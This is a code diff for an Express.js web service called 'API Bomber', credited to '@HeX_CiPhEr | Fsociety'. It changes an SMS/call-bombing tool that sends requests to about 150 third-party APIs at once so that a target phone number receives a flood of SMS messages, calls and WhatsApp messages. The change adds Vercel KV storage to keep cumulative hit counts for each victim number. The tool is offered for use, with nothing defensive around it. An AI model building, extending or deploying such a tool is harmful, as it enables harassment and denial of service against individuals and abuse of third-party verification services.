@@ -1,9 +1,10 @@
-// API Bomber - Single Massive Burst (All 150 APIs at Once)
+// API Bomber - Persistent Cumulative Count with Vercel KV
 // @HeX_CiPhEr | Fsociety
 
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
+const { kv } = require('@vercel/kv');
 
 const app = express();
 app.use(cors());
@@ -159,15 +160,10 @@ async function runFullBurst(phone) {
   const formats = getFormats(phone);
   const targetPhone = randomItem(formats);
   
-  // Create an array of promises for all APIs
   const promises = APIS.map(api => sendRequest(api, targetPhone));
-  
-  // Wait for all to complete (or fail)
   const results = await Promise.all(promises);
   
-  // Count successes and failures
   let sms = 0, calls = 0, whatsapp = 0, total = 0;
-  
   results.forEach(result => {
     if (result.success && result.status && [200, 201, 202, 204].includes(result.status)) {
       total++;
@@ -178,7 +174,7 @@ async function runFullBurst(phone) {
     }
   });
   
-  return { sms, calls, whatsapp, total, totalAPIs: APIS.length };
+  return { sms, calls, whatsapp, total };
 }
 
 // ==================== ROUTES ====================
@@ -190,11 +186,11 @@ app.get('/', (req, res) => {
     name: 'API Bomber', 
     apis: APIS.length, 
     author: '@HeX_CiPhEr',
-    note: 'Use /start/:phone to send ALL APIs at once'
+    note: 'Use /start/:phone to send ALL APIs at once (cumulative)'
   });
 });
 
-// START — Fire ALL APIs in one massive burst
+// START — Fire ALL APIs, accumulate, store in KV, return cumulative
 app.get('/start/:phone', async (req, res) => {
   const phone = req.params.phone;
   if (!phone || !phone.match(/^\d{10}$/)) {
@@ -212,20 +208,33 @@ app.get('/start/:phone', async (req, res) => {
   }
   userLastRequest[phone] = now;
   
-  // Run the full burst
-  const stats = await runFullBurst(phone);
+  // Fetch current cumulative from KV
+  const kvKey = `bomber:${phone}`;
+  let cumulative = await kv.get(kvKey);
+  if (!cumulative) {
+    cumulative = { sms: 0, calls: 0, whatsapp: 0, total: 0 };
+  }
   
+  // Run the burst
+  const burstStats = await runFullBurst(phone);
+  
+  // Add to cumulative
+  cumulative.sms += burstStats.sms;
+  cumulative.calls += burstStats.calls;
+  cumulative.whatsapp += burstStats.whatsapp;
+  cumulative.total += burstStats.total;
+  
+  // Store back in KV
+  await kv.set(kvKey, cumulative);
+  
+  // Send response
   res.json({
     success: true,
     target: phone,
-    total_apis_sent: stats.totalAPIs,
-    stats: {
-      sms: stats.sms,
-      calls: stats.calls,
-      whatsapp: stats.whatsapp,
-      total_success: stats.total
-    },
-    note: 'All APIs fired at once'
+    total_apis_sent: APIS.length,
+    this_burst: burstStats,
+    cumulative_total: cumulative,
+    footer: 'Powered by @HeX_CiPhEr'
   });
 });
 
